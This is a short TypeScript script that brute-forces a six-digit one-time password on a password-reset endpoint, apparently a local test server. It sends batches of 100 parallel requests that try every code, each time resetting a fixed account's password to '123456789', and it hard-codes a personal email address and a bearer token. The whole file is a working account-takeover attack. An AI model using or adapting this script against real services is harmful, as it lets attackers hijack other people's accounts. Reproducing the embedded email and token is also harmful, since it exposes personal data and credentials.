import axios from 'axios';


async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "tarunsharmakhurja10@gmail.com",
        "otp": otp,
        "newPassword": "123456789"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-Password',
        headers: { 
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NmI4YjQ1N2M5NDE2NzQ3YzdhODk0MGUiLCJpYXQiOjE3MjMzODA4MjN9.V6XV3i3cPtc4xfc4fKaJkNDujk7_2PwdgJP_90csn6g', 
            'Content-Type': 'application/json'
        },
        data : data
    };
    try{
        await axios.request(config)
    }catch(e){
        //console.log(e)
    }
    

}
async function main(){
    for(let i=99999;i<999999;i+=100){
        const p = [];
        console.log(i);
        for(let j=0;j<100;j++){
            p.push(sendRequest((i+j).toString()));
        }
        await Promise.all(p);
    }
}
main();